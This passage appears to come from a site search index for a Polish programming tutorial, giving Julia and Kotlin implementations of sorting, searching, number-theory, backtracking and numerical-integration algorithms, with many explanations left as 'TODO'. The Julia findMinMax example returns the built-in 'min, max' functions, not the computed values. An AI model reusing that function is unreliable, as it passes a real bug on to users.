return -1\n    end\nend\n\narray = [1, 2, 5, 5, 7, 5, 5, 10, 5, 5]\n\nprintln(majority(array))\n</code></pre>"},{"location":"programming/julia/algorithms/searching/min-max-search/","title":"Jednoczesne wyszukiwanie minimum i maksimum","text":""},{"location":"programming/julia/algorithms/searching/min-max-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/julia/algorithms/searching/min-max-search/#podejscie-naiwne","title":"Podej\u015bcie naiwne","text":""},{"location":"programming/julia/algorithms/searching/min-max-search/#podejscie-optymalne","title":"Podej\u015bcie optymalne","text":"<pre><code>function MinMax(array)\n    minCandidates = []\n    maxCandidates = []\n\n    for i in 2:2:length(array)\n        if array[i - 1] &lt; array[i]\n            push!(minCandidates, array[i - 1])\n            push!(maxCandidates, array[i])\n        else\n            push!(minCandidates, array[i])\n            push!(maxCandidates, array[i - 1])\n        end\n    end\n\n    if length(array) % 2 == 1\n        push!(minCandidates, array[end])\n        push!(maxCandidates, array[end])\n    end\n\n    minValue = minCandidates[1]\n    maxValue = maxCandidates[1]\n\n    for i in eachindex(minCandidates)\n        minValue = min(minValue, minCandidates[i])\n        maxValue = max(maxValue, maxCandidates[i])\n    end\n\n    return minValue, maxValue\nend\n\narray = [3, 6, 1, 9, 10, 4, -4, 6, 12, 5, 11]\nprintln(MinMax(array))\n</code></pre>"},{"location":"programming/julia/algorithms/searching/min-or-max/","title":"Wyszukiwanie minimum i maksimum","text":""},{"location":"programming/julia/algorithms/searching/min-or-max/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/julia/algorithms/searching/min-or-max/#wyszukiwanie-wartosci-minimum-i-maksimum","title":"Wyszukiwanie warto\u015bci minimum i maksimum","text":""},{"location":"programming/julia/algorithms/searching/min-or-max/#implementacja","title":"Implementacja","text":"<pre><code>function findMinMax(array)\n    minVal = array[1]\n    maxVal = array[1]\n\n    for el in array\n        if el &lt; minVal\n            minVal = el\n        elseif el &gt; maxVal\n            maxVal = el\n        end\n    end\n\n    return min, max\nend\n\narray = [8, 2, 9, 10, 5, 4, 2, 7, 18, 0]\n\nprintln(\"Values: \", findMinMax(array))\n</code></pre>"},{"location":"programming/julia/algorithms/searching/min-or-max/#wyszukiwanie-indeksow-wartosci-minimum-i-maksimum","title":"Wyszukiwanie indeks\u00f3w warto\u015bci minimum i maksimum","text":""},{"location":"programming/julia/algorithms/searching/min-or-max/#implementacja_1","title":"Implementacja","text":"<pre><code>function findMinMaxIndex(array)\n    minVal = array[1]\n    minInd = 1\n    maxVal = array[1]\n    maxInd = 1\n\n    for i in eachindex(array)\n        if array[i] &lt; minVal\n            minVal = array[i]\n            minInd = i\n        elseif array[i] &gt; maxVal\n            maxVal = array[i]\n            maxInd = i\n        end\n    end\n\n    return minInd, maxInd\nend\n\narray = [8, 2, 9, 10, 5, 4, 2, 7, 18, 0]\n\nprintln(\"Indexes: \", findMinMaxIndex(array))\n</code></pre>"},{"location":"programming/julia/algorithms/sorting/bubble-sort/","title":"Sortowanie b\u0105belkowe","text":""},{"location":"programming/julia/algorithms/sorting/bubble-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/julia/algorithms/sorting/bubble-sort/#implementacja","title":"Implementacja","text":"<pre><code>function bubbleSort(array)\n    sorted = false\n    i = 2\n    while !sorted\n        sorted = true\n        for j = length(array):-1:i\n            if array[j] &lt; array[j-1]\n                array[j], array[j-1] = array[j-1], array[j]\n                sorted = false\n            end\n        end\n\n        i += 1\n    end\nend\n\narray = [7, 3, 0, 1, 5, 2, 5, 19, 10, 5]\n\nbubbleSort(array)\n\nprintln(array)\n</code></pre>"},{"location":"programming/julia/algorithms/sorting/bubble-sort/#opis-implementacji","title":"Opis implementacji","text":"<p>Zaczynamy od utworzenia funkcji sortuj\u0105cej bubbleSort (linia 1), kt\u00f3ra przyjmuje jeden argument: list\u0119 element\u00f3w do posortowania.</p> <p>Wewn\u0105trz funkcji tworzymy zmienne pomocnicze do pami\u0119tania, czy lista jest ju\u017c posortowana (linia 2) oraz do pami\u0119tania liczby posortowanych element\u00f3w (linia 3). Nast\u0119pnie uruchamiamy p\u0119tl\u0119, kt\u00f3ra b\u0119dzie wykonywa\u0107 operacje a\u017c do posortowania ca\u0142ej listy (linia 4). W p\u0119tli na pocz\u0105tku zak\u0142adamy, \u017ce lista zosta\u0142a ju\u017c posortowana (linia 5), a nast\u0119pnie zaczynamy kolejn\u0105 p\u0119tl\u0119 przechodz\u0105c\u0105 indeksami od ko\u0144ca tablicy do jej pocz\u0105tku, uwzgl\u0119dniaj\u0105c liczb\u0119 posortowanych ju\u017c element\u00f3w (linia 6). W tej zagnie\u017cd\u017conej p\u0119tli por\u00f3wnujemy ze sob\u0105 s\u0105siednie elementy listy (linia 7), a gdy s\u0105 u\u0142o\u017cone niezgodnie z porz\u0105dkiem sortowania, to zamieniamy je miejscami (linia 8). Zapami\u0119tujemy tak\u017ce, \u017ce lista nie zosta\u0142a jeszcze posortowana, poniewa\u017c dokonali\u015bmy zamiany (linia 9). Po wyj\u015bciu z zagnie\u017cd\u017conej p\u0119tli zwi\u0119kszamy licznik posortowanych element\u00f3w (linia 13).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej tworzymy list\u0119 do sortowania (linia 18), sortujemy j\u0105 wywo\u0142uj\u0105c nasz\u0105 funkcj\u0119 sortuj\u0105c\u0105 bubbleSort (linia 20) i wypisujemy posortowan\u0105 list\u0119 na ekranie (linia 22).</p>"},{"location":"programming/julia/algorithms/sorting/merge-sort/","title":"Sortowanie przez scalanie","text":""},{"location":"programming/julia/algorithms/sorting/merge-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/julia/algorithms/sorting/merge-sort/#implementacja","title":"Implementacja","text":"<pre><code>function merge(array, left, right, division)\n    mergedLength = right - left\n    merged = Array{Int}(undef, mergedLength)\n    index1 = left\n    index2 = division\n\n    for i in eachindex(merged)\n        if index1 &gt;= division || (index2 &lt; right &amp;&amp; array[index1] &gt; array[index2])\n            merged[i] = array[index2]\n            index2 += 1\n        else\n            merged[i] = array[index1]\n            index1 += 1\n        end\n    end\n\n    for i in eachindex(merged)\n        array[left + i - 1] = merged[i]\n    end\nend\n\nfunction mergeSort(array, left, right)\n    if right - left &lt;= 1\n        return\n    end\n\n    division = (left + right) \u00f7 2\n\n    mergeSort(array, left, division)\n    mergeSort(array, division, right)\n\n    merge(array, left, right, division)\nend\n\narray = [7, 3, 0, 1, 5, 2, 5, 19, 10, 5]\n\nmergeSort(array, 1, length(array) + 1)\n\nprintln(array)\n</code></pre>"},{"location":"programming/julia/algorithms/sorting/quick-sort/","title":"Sortowanie szybkie","text":""},{"location":"programming/julia/algorithms/sorting/quick-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/julia/algorithms/sorting/quick-sort/#implementacja","title":"Implementacja","text":"<pre><code>function quicksort(array, left, right)\n    if right &lt;= left\n        return\n    end\n\n    pivot = array[(left + right) \u00f7 2]\n    i = left\n    j = right\n\n    while i &lt;= j\n        while array[i] &lt; pivot\n            i += 1\n        end\n\n        while array[j] &gt; pivot\n            j -= 1\n        end\n\n        if i &gt; j\n            break\n        end\n\n        array[i], array[j] = array[j], array[i]\n\n        i += 1\n        j -= 1\n    end\n\n    quicksort(array, left, j)\n    quicksort(array, i, right)\nend\n\narray = [7, 3, 0, 1, 5, 2, 5, 19, 10, 5]\n\nquicksort(array, 1, length(array))\n\nprintln(array)\n</code></pre>"},{"location":"programming/kotlin/","title":"Kotlin","text":"<p>Kotlin to statycznie typowany, nowoczesny j\u0119zyk programowania, kt\u00f3ry dzia\u0142a na platformie Java Virtual Machine (JVM) oraz mo\u017ce by\u0107 transpilowany do JavaScriptu i kodu natywnego. Kotlin zosta\u0142 stworzony przez firm\u0119 JetBrains, znan\u0105 z produkcji popularnych \u015brodowisk programistycznych (IDE), takich jak IntelliJ IDEA czy PyCharm. Pierwsze stabilne wydanie j\u0119zyka Kotlin mia\u0142o miejsce w 2016 roku.</p> <p> Kotlin</p>"},{"location":"programming/kotlin/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Interoperacyjno\u015b\u0107 z Jav\u0105: Kotlin jest w pe\u0142ni interoperacyjny z Jav\u0105, co oznacza, \u017ce mo\u017cemy korzysta\u0107 z istniej\u0105cych bibliotek i framework\u00f3w Javy bez \u017cadnych problem\u00f3w.</p> </li> <li> <p>Sk\u0142adnia przyjazna dla programist\u00f3w: Kotlin ma bardziej zwi\u0119z\u0142\u0105 i wyra\u017an\u0105 sk\u0142adni\u0119 ni\u017c Java, co czyni go \u0142atwiejszym do nauki i pisania. Kotlin eliminuje wiele powszechnych pu\u0142apek Javy, takich jak null pointer exceptions.</p> </li> <li> <p>Wsparcie dla programowania funkcyjnego: Kotlin zawiera wiele cech charakterystycznych dla j\u0119zyk\u00f3w funkcyjnych, takich jak funkcje pierwszej klasy, immutable data structures i operator map, co pomaga tworzy\u0107 kod bardziej zwi\u0119z\u0142y i czytelny.</p> </li> <li> <p>Wsparcie dla Androida: Google oficjalnie popiera Kotlin jako preferowany j\u0119zyk do tworzenia aplikacji na Androida, co przyczynia si\u0119 do jego rosn\u0105cej popularno\u015bci.</p> </li> <li> <p>Bezpiecze\u0144stwo: Kotlin posiada wbudowane mechanizmy bezpiecze\u0144stwa, takie jak unikanie null pointer exceptions przez wbudowane typy nullable oraz immutability jako domy\u015bln\u0105 opcj\u0119 dla list i innych kolekcji.</p> </li> </ol> <p>Kotlin jest cz\u0119sto u\u017cywany do tworzenia aplikacji na Androida, ale jest te\u017c popularnym wyborem dla serwer-side development, szczeg\u00f3lnie przy u\u017cyciu framework\u00f3w takich jak Spring.</p>"},{"location":"programming/kotlin/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"programming/kotlin/#popularnosc-jezyka","title":"Popularno\u015b\u0107 j\u0119zyka","text":"<p>Wykres popularno\u015bci j\u0119zyka Kotlin</p>"},{"location":"programming/kotlin/algorithms/backtracking/n-queens/","title":"Problem n kr\u00f3lowych","text":""},{"location":"programming/kotlin/algorithms/backtracking/n-queens/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/backtracking/n-queens/#implementacja","title":"Implementacja","text":"<pre><code>fun findSolution(n: Int, queenId: Int, positions: Array&lt;Int&gt;): Boolean {\n    if (queenId == n) {\n        return true\n    }\n\n    for (i in 0 until n) {\n        if (!checkNewPosition(queenId, i, positions)) {\n            continue\n        }\n\n        positions[queenId] = i\n\n        if (findSolution(n, queenId + 1, positions)) {\n            return true\n        }\n    }\n\n    return false\n}\n\nfun checkNewPosition(x: Int, y: Int, positions: Array&lt;Int&gt;): Boolean {\n    for (i in 0 until x) {\n        if (positions[i] == y) {\n            return false\n        }\n\n        if ((y - positions[i]) == (x - i) or (y - positions[i]) == (i - x)) {\n            return false\n        }\n    }\n\n    return true\n}\n\nfun printCheckboard(n: Int, positions: Array&lt;Int&gt;) {\n    val board = Array(n) { IntArray(n) }\n\n    for (i in 0 until n) {\n        board[positions[i]][i] = 1\n    }\n\n    for (i in 0 until n) {\n        println(board[i].contentToString())\n    }\n}\n\nfun main() {\n  val n = 5\n  val positions = Array(n) {0}\n\n  val result = findSolution(n, 0, positions)\n\n  if (result) {\n      println(\"Pozycje:\")\n      println(positions.contentToString())\n      println(\"Szachownica:\")\n      printCheckboard(n, positions)\n  } else {\n      println(\"Brak rozwiazania\")\n  }\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/backtracking/permutations/","title":"Permutacje","text":""},{"location":"programming/kotlin/algorithms/backtracking/permutations/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/backtracking/permutations/#implementacja","title":"Implementacja","text":"<pre><code>fun permutation(elements: Array&lt;Int&gt;, start: Int, stop: Int) {\n    if (start == stop) {\n        println(elements.contentToString())\n        return\n    }\n\n    for (i in start until stop + 1) {\n        var tmp = elements[start]\n        elements[start] = elements[i]\n        elements[i] = tmp\n\n        permutation(elements, start + 1, stop)\n\n        tmp = elements[start]\n        elements[start] = elements[i]\n        elements[i] = tmp\n    }\n}\n\nfun main() {\n  val elements = arrayOf(1, 2, 3)\n\n  println(\"Permutacje:\")\n  permutation(elements, 0, 2)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/integers/divisors/","title":"Wszystkie dzielniki","text":""},{"location":"programming/kotlin/algorithms/integers/divisors/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/integers/divisors/#rozwiazanie-zupenie-naiwne","title":"Rozwi\u0105zanie zupe\u0142nie naiwne","text":""},{"location":"programming/kotlin/algorithms/integers/divisors/#implementacja","title":"Implementacja","text":"<pre><code>fun printDivisors(n: Int) {\n  for (i in 1 until n + 1) {\n    if (n % i == 0) {\n      println(i)\n    }\n  }\n}\n\nfun main() {\n  val n = 12\n\n  println(\"Dzielniki liczby $n:\")\n  printDivisors(n)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/integers/divisors/#link-do-implementacji","title":"Link do implementacji","text":"<p>Wszystkie dzielniki - podej\u015bcie zupe\u0142nie naiwne</p>"},{"location":"programming/kotlin/algorithms/integers/divisors/#opis-implementacji","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/integers/divisors/#rozwiazanie-naiwne","title":"Rozwi\u0105zanie naiwne","text":""},{"location":"programming/kotlin/algorithms/integers/divisors/#implementacja_1","title":"Implementacja","text":"<pre><code>fun printDivisors(n: Int) {\n  for (i in 1 until (n / 2) + 1) {\n    if (n % i == 0) {\n      println(i)\n    }\n  }\n\n  if (n &gt; 1) {\n    println(n)\n  }\n}\n\nfun main() {\n  val n = 12\n\n  println(\"Dzielniki liczby $n:\")\n  printDivisors(n)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/integers/divisors/#link-do-implementacji_1","title":"Link do implementacji","text":"<p>Wszystkie dzielniki - podej\u015bcie naiwne</p>"},{"location":"programming/kotlin/algorithms/integers/divisors/#opis-implementacji_1","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/integers/divisors/#rozwiazanie-optymalne","title":"Rozwi\u0105zanie optymalne","text":""},{"location":"programming/kotlin/algorithms/integers/divisors/#implementacja_2","title":"Implementacja","text":"<pre><code>import kotlin.math.sqrt\n\nfun printDivisors(n: Int) {\n  for (i in 1 until sqrt(n.toDouble()).toInt() + 1) {\n    if (n % i == 0) {\n      println(i)\n\n      if (i != n / i) {\n        println(n / i)\n      }\n    }\n  }\n}\n\nfun main() {\n  val n = 12\n\n  println(\"Dzielniki liczby $n:\")\n  printDivisors(n)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/integers/divisors/#link-do-implementacji_2","title":"Link do implementacji","text":"<p>Wszystkie dzielniki - podej\u015bcie optymalne</p>"},{"location":"programming/kotlin/algorithms/integers/divisors/#opis-implementacji_2","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/integers/eratosthenes-sieve/","title":"Sito Eratostenesa","text":""},{"location":"programming/kotlin/algorithms/integers/eratosthenes-sieve/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/integers/eratosthenes-sieve/#implementacja","title":"Implementacja","text":"<pre><code>fun sieve(n: Int): List&lt;Boolean&gt; {\n  var primes = mutableListOf(false, false)\n\n  for (i in 2 until n + 1) {\n    primes.add(true)\n  }\n\n  for (i in 2 until n) {\n    if (!primes[i]) {\n      continue\n    }\n\n    for (j in 2 * i until n + 1 step i) {\n      primes[j] = false\n    }\n  }\n\n  return primes\n}\n\nfun printPrimeNumbers(primes: List&lt;Boolean&gt;) {\n  for (i in 0 until primes.count()) {\n    if (primes[i]) {\n      println(i)\n    }\n  }\n}\n\nfun main() {\n  val n = 100\n\n  val primes = sieve(n)\n\n  println(\"Liczby pierwsze od 1 do $n:\")\n  printPrimeNumbers(primes)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/integers/eratosthenes-sieve/#link-do-implementacji","title":"Link do implementacji","text":"<p>Sito Eratostenesa</p>"},{"location":"programming/kotlin/algorithms/integers/eratosthenes-sieve/#opis-implementacji","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/integers/fibonacci-numbers/","title":"Liczby Fibonacciego","text":""},{"location":"programming/kotlin/algorithms/integers/fibonacci-numbers/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/integers/fibonacci-numbers/#wersja-iteracyjna","title":"Wersja iteracyjna","text":""},{"location":"programming/kotlin/algorithms/integers/fibonacci-numbers/#implementacja","title":"Implementacja","text":"<pre><code>fun fib(n: Int): Int {\n  var f1 = 1\n  var f2 = 1\n\n  for (i in 3 until n + 1) {\n    val f3 = f1 + f2\n    f1 = f2\n    f2 = f3\n  }\n\n  return f2\n}\n\nfun main() {\n  val n = 10\n\n  val result = fib(n)\n\n  println(\"fib($n) = $result\")\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/integers/fibonacci-numbers/#link-do-implementacji","title":"Link do implementacji","text":"<p>Liczby Fibonacciego - wersja iteracyjna</p>"},{"location":"programming/kotlin/algorithms/integers/fibonacci-numbers/#opis-implementacji","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/integers/fibonacci-numbers/#wersja-rekurencyjna","title":"Wersja rekurencyjna","text":""},{"location":"programming/kotlin/algorithms/integers/fibonacci-numbers/#implementacja_1","title":"Implementacja","text":"<pre><code>fun fib(n: Int): Int {\n  if (n &lt;= 2) {\n    return 1\n  }\n\n  return fib(n - 1) + fib(n - 2)\n}\n\nfun main() {\n  val n = 10\n\n  val result = fib(n)\n\n  println(\"fib($n) = $result\")\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/integers/fibonacci-numbers/#link-do-implementacji_1","title":"Link do implementacji","text":"<p>Liczby Fibonacciego - wersja rekurencyjna</p>"},{"location":"programming/kotlin/algorithms/integers/fibonacci-numbers/#opis-implementacji_1","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/integers/gcd/","title":"NWD","text":""},{"location":"programming/kotlin/algorithms/integers/gcd/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/integers/gcd/#algorytm-nwd-z-odejmowaniem","title":"Algorytm NWD z odejmowaniem","text":""},{"location":"programming/kotlin/algorithms/integers/gcd/#implementacja","title":"Implementacja","text":"<pre><code>fun gcd(num1: Int, num2: Int): Int {\n  var a = num1\n  var b = num2\n\n  while (a != b) {\n    if (a &gt; b) {\n      a -= b\n    } else {\n      b -= a\n    }\n  }\n\n  return a\n}\n\nfun main() {\n  val a = 32\n  val b = 12\n\n  val result = gcd(a, b)\n\n  println(\"GCD($a, $b) = $result\")\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/integers/gcd/#link-do-implementacji","title":"Link do implementacji","text":"<p>NWD z odejmowaniem</p>"},{"location":"programming/kotlin/algorithms/integers/gcd/#opis-implementacji","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/integers/gcd/#algorytm-euklidesa-wersja-iteracyjna","title":"Algorytm Euklidesa - wersja iteracyjna","text":""},{"location":"programming/kotlin/algorithms/integers/gcd/#implementacja_1","title":"Implementacja","text":"<pre><code>fun gcd(num1: Int, num2: Int): Int {\n  var a = num1\n  var b = num2\n\n  while (b != 0) {\n    val b2 = b\n    b = a % b\n    a = b2\n  }\n\n  return a\n}\n\nfun main() {\n  val a = 32\n  val b = 12\n\n  val result = gcd(a, b)\n\n  println(\"GCD($a, $b) = $result\")\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/integers/gcd/#link-do-implementacji_1","title":"Link do implementacji","text":"<p>Algorytm Euklidesa - wersja iteracyjna</p>"},{"location":"programming/kotlin/algorithms/integers/gcd/#opis-implementacji_1","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/integers/gcd/#algorytm-euklidesa-wersja-rekurencyjna","title":"Algorytm Euklidesa - wersja rekurencyjna","text":""},{"location":"programming/kotlin/algorithms/integers/gcd/#implementacja_2","title":"Implementacja","text":"<pre><code>fun gcd(a: Int, b: Int): Int {\n  if (b == 0) {\n    return a\n  }\n\n  return gcd(b, a % b)\n}\n\nfun main() {\n  val a = 32\n  val b = 12\n\n  val result = gcd(a, b)\n\n  println(\"GCD($a, $b) = $result\")\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/integers/gcd/#link-do-implementacji_2","title":"Link do implementacji","text":"<p>Algorytm Euklidesa - wersja rekurencyjna</p>"},{"location":"programming/kotlin/algorithms/integers/gcd/#opis-implementacji_2","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/integers/perfect-test/","title":"Test doskona\u0142o\u015bci","text":""},{"location":"programming/kotlin/algorithms/integers/perfect-test/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/integers/perfect-test/#implementacja","title":"Implementacja","text":"<pre><code>fun isPerfect(n: Int): Boolean {\n  var sum = 0\n\n  for (i in 1 until n) {\n    if (n % i == 0) {\n      sum += i\n    }\n  }\n\n  return sum == n\n}\n\nfun main() {\n  val n = 6\n\n  val result = isPerfect(n)\n\n  if (result) {\n    println(\"$n jest liczba doskonala\")\n  } else {\n    println(\"$n nie jest liczba doskonala\")\n  }\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/integers/perfect-test/#link-do-implementacji","title":"Link do implementacji","text":"<p>Test doskona\u0142o\u015bci</p>"},{"location":"programming/kotlin/algorithms/integers/perfect-test/#opis-implementacji","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/integers/prime-factors/","title":"Rozk\u0142ad na czynniki pierwsze","text":""},{"location":"programming/kotlin/algorithms/integers/prime-factors/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/integers/prime-factors/#implementacja","title":"Implementacja","text":"<pre><code>fun distribute(num: Int): List&lt;Int&gt; {\n  var primeFactors: MutableList&lt;Int&gt; = mutableListOf()\n  var i = 2\n  var n = num\n\n  while (n &gt; 1) {\n    if (n % i == 0) {\n      primeFactors.add(i)\n      n /= i\n    } else {\n      i++\n    }\n  }\n\n  return primeFactors\n}\n\nfun main() {\n  val n = 124\n\n  val result = distribute(n)\n\n  println(\"Czynniki pierwsze liczby $n: $result\")\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/integers/prime-factors/#link-do-implementacji","title":"Link do implementacji","text":"<p>Rozk\u0142ad na czynniki pierwsze</p>"},{"location":"programming/kotlin/algorithms/integers/prime-factors/#opis-implementacji","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/integers/prime-test/","title":"Test pierwszo\u015bci","text":""},{"location":"programming/kotlin/algorithms/integers/prime-test/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/integers/prime-test/#implementacja","title":"Implementacja","text":"<pre><code>import kotlin.math.sqrt\n\nfun isPrime(n: Int): Boolean {\n  if (n &lt; 2) {\n    return false\n  }\n\n  for (i in 2 until sqrt(n.toDouble()).toInt() + 1) {\n    if (n % i == 0) {\n      return false\n    }\n  }\n\n  return true\n}\n\nfun main() {\n  val n = 7\n\n  val result = isPrime(n)\n\n  if (result) {\n    println(\"$n jest liczba pierwsza\")\n  } else {\n    println(\"$n nie jest liczba pierwsza\")\n  }\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/integers/prime-test/#link-do-implementacji","title":"Link do implementacji","text":"<p>Test pierwszo\u015bci</p>"},{"location":"programming/kotlin/algorithms/integers/prime-test/#opis-implementacji","title":"Opis implementacji","text":"<p>TODO</p>"},{"location":"programming/kotlin/algorithms/numerical-methods/numerical-integration/","title":"Ca\u0142kowanie numeryczne","text":""},{"location":"programming/kotlin/algorithms/numerical-methods/numerical-integration/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/numerical-methods/numerical-integration/#metoda-prostokatow","title":"Metoda prostok\u0105t\u00f3w","text":"<pre><code>fun f(x: Double): Double {\n    return x * x + 2 * x\n}\n\nfun rectanglesMethod(a: Int, b: Int, n: Int): Double {\n    val rectangleWidth = (b - a).toDouble() / n.toDouble()\n    var area = 0.0\n    var currentPoint = a.toDouble()\n\n    for (i in 1..n) {\n        currentPoint += rectangleWidth\n        val rectangleHeight = f(currentPoint)\n        area += rectangleHeight * rectangleWidth\n    }\n\n    return area\n}\n\nfun main() {\n    val a = 0\n    val b = 10\n    val n = 100\n\n    val area = rectanglesMethod(a, b, n)\n\n    println(area)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/numerical-methods/numerical-integration/#link-do-implementacji","title":"Link do implementacji","text":"<p>Ca\u0142kowanie numeryczne - metoda prostok\u0105t\u00f3w</p>"},{"location":"programming/kotlin/algorithms/numerical-methods/numerical-integration/#metoda-trapezow","title":"Metoda trapez\u00f3w","text":"<pre><code>fun f(x: Double): Double {\n    return x * x + 2 * x\n}\n\nfun trapezesMethod(a: Int, b: Int, n: Int): Double {\n    val trapezeHeight = (b - a).toDouble() / n.toDouble()\n    var area = 0.0\n    var currentPoint = a.toDouble()\n\n    for (i in 1..n) {\n        val trapezeFirstSide = f(currentPoint)\n        currentPoint += trapezeHeight\n        val trapezeSecondSide = f(currentPoint)\n        area += ((trapezeFirstSide + trapezeSecondSide) * trapezeHeight) / 2\n    }\n\n    return area\n}\n\nfun main() {\n    val a = 0\n    val b = 10\n    val n = 100\n\n    val area = trapezesMethod(a, b, n)\n\n    println(area)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/numerical-methods/numerical-integration/#link-do-implementacji_1","title":"Link do implementacji","text":"<p>Ca\u0142kowanie numeryczne - metoda trapez\u00f3w</p>"},{"location":"programming/kotlin/algorithms/searching/binary-search/","title":"Wyszukiwanie binarne","text":""},{"location":"programming/kotlin/algorithms/searching/binary-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/searching/binary-search/#wersja-iteracyjna","title":"Wersja iteracyjna","text":""},{"location":"programming/kotlin/algorithms/searching/binary-search/#implementacja","title":"Implementacja","text":"<pre><code>fun binarySearch(array: List&lt;Int&gt;, number: Int): Int {\n  var left = 0\n  var right = array.count() - 1\n\n  while (left &lt; right) {\n    val middle = (left + right) / 2\n\n    if (number &lt; array[middle]) {\n      right = middle\n    } else if (number &gt; array[middle]) {\n      left = middle + 1\n    } else {\n      return middle\n    }\n  }\n\n  if (left &lt; array.count() &amp;&amp; array[left] == number) {\n    return left\n  }\n\n  return -1\n}\n\nfun main() {\n  val array = listOf(1, 2, 3, 4, 5, 6, 7, 8, 9, 10)\n  val number = 8\n\n  val index = binarySearch(array, number)\n\n  if (index == -1) {\n    println(\"Szukanej liczby nie ma na liscie\")\n  } else {\n    println(\"Szukana liczba znajduje sie pod indeksem $index\")\n  }\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/searching/binary-search/#link-do-implementacji","title":"Link do implementacji","text":"<p>Wyszukiwanie binarne - wersja iteracyjna</p>"},{"location":"programming/kotlin/algorithms/searching/binary-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>binarySearch</code> (linia 1) przyjmuje dwa argumenty: uporz\u0105dkowan\u0105 rosn\u0105co list\u0119 liczb ca\u0142kowitych (<code>array</code>) oraz poszukiwan\u0105 liczb\u0119 ca\u0142kowit\u0105 (<code>number</code>). Wynikiem zwracanym przez funkcj\u0119 b\u0119dzie liczba ca\u0142kowita reprezentuj\u0105ca pozycj\u0119 (indeks) szukanej warto\u015bci na li\u015bcie <code>array</code>, lub \\(-1\\), gdy elementu nie znaleziono.</p> <p>Zaczynamy od okre\u015blenia przeszukiwanego zakresu (w postaci indeks\u00f3w element\u00f3w listy). Pocz\u0105tek zakresu (<code>left</code>) ustalamy na pierwsz\u0105 pozycj\u0119 na li\u015bcie, czyli \\(0\\) (linia 2). Koniec zakresu (<code>right</code>) ustalamy na ostatni\u0105 pozycj\u0119 na li\u015bcie, kt\u00f3r\u0105 obliczamy odejmuj\u0105c \\(1\\) od rozmiaru listy (linia 3). Rozmiar listy pobieramy za pomoc\u0105 metody <code>count()</code>.</p> <p>Po ustaleniu zakresu przechodzimy do przeszukiwania. Przeszukiwanie wykonujemy w p\u0119tli, tak d\u0142ugo jak zakres pozostaje poprawny, a w zakresie znajduj\u0105 si\u0119 co najmniej dwie warto\u015bci (linia 5). Wewn\u0105trz p\u0119tli obliczamy \u015brodek obecnego zakresu i zapisujemy w zmiennej <code>middle</code> (linia 6). Nast\u0119pnie sprawdzamy relacj\u0119 poszukiwanej liczby z warto\u015bci\u0105 znajduj\u0105c\u0105 si\u0119 pod \u015brodkowym indeksem. Je\u017celi poszukiwana warto\u015b\u0107 jest mniejsza (linia 8), to zmieniamy koniec przeszukiwanego przedzia\u0142u (linia 9). W przeciwnym przypadku, je\u017celi poszukiwana liczba jest wi\u0119ksza od warto\u015bci znajduj\u0105cej si\u0119 w \u015brodku przedzia\u0142u (linia 10), to zmieniamy pocz\u0105tek przedzia\u0142u (linia 11). W przeciwnym przypadku, tzn., gdy poszukiwana liczba nie jest ani mniejsza ani wi\u0119ksza od warto\u015bci znajduj\u0105cej si\u0119 pod indeksem <code>middle</code>, oznacza to, \u017ce znale\u017ali\u015bmy poszukiwan\u0105 warto\u015b\u0107, wi\u0119c zwracamy jej indeks, czyli warto\u015b\u0107 zmiennej <code>middle</code> (linia 13).</p> <p>Po wyj\u015bciu z p\u0119tli, to znaczy gdy nie znale\u017ali\u015bmy jeszcze poszukiwanej warto\u015bci, sprawdzamy, czy pocz\u0105tek przeszukiwanego zakresu nie przekroczy\u0142 